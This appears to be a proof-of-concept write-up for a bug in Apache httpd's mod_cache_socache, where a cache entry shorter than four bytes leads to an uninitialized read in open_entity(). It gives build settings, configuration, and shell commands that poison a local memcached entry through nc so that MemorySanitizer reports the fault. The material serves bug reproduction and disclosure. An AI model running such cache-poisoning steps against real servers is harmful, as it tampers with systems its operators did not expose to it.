# PoC 053 — short cache entry: `format` read past retrieved length

`open_entity()` only rejects oversized cache entries. A successful socache
retrieval returning fewer than `sizeof(apr_uint32_t)` bytes still proceeds
into `memcpy(&format, sobj->buffer, sizeof(format))`, reading uninitialized
pool bytes.

## Setup

Build httpd with `mod_cache_socache` and the `socache_memcache` provider.
Run under MemorySanitizer or Valgrind.

```
CFLAGS='-fsanitize=memory -fsanitize-memory-track-origins -O1 -g' \
LDFLAGS='-fsanitize=memory' \
./configure --enable-cache --enable-cache-socache \
            --enable-socache-memcache \
            --with-mpm=event --enable-mods-static=few
make -j4
```

`httpd.conf`:

```
Listen 127.0.0.1:8080
LoadModule cache_module           modules/mod_cache.so
LoadModule cache_socache_module   modules/mod_cache_socache.so
LoadModule socache_memcache_module modules/mod_socache_memcache.so
ServerName localhost

CacheSocache memcache:127.0.0.1:11211
CacheSocacheMaxSize 102400
<Location />
    CacheEnable socache
    CacheIgnoreNoLastMod On
</Location>
DocumentRoot /var/www
```

Start memcached:

```
memcached -l 127.0.0.1 -p 11211 -m 64 &
```

## Trigger

Issue a normal request to compute the cache key, scrape it from the
debug log, then poison the cache value with a 2-byte payload using the
memcache text protocol:

```
curl -s http://127.0.0.1:8080/index.html >/dev/null
KEY=$(grep -oE 'cache key: [^ ]+' logs/error_log | tail -1 | cut -d' ' -f3)

# Replace the cached value with something shorter than sizeof(uint32_t)
printf 'set %s 0 0 2\r\nAB\r\n' "$KEY" | nc -q1 127.0.0.1 11211

# Force lookup to traverse the short entry
curl -i http://127.0.0.1:8080/index.html
```

## Observed effect

MemorySanitizer flags an uninitialized read inside `open_entity()` at
`mod_cache_socache.c:535`:

```
==12345==WARNING: MemorySanitizer: use-of-uninitialized-value
    #0 0x... in open_entity modules/cache/mod_cache_socache.c:535
```

Without sanitisers the symptoms are non-deterministic: the indeterminate
`format` value either matches `CACHE_SOCACHE_DISK_FORMAT_VERSION`,
`CACHE_SOCACHE_VARY_FORMAT_VERSION`, or neither, so the request takes
unrelated parsing paths or returns `DECLINED`.
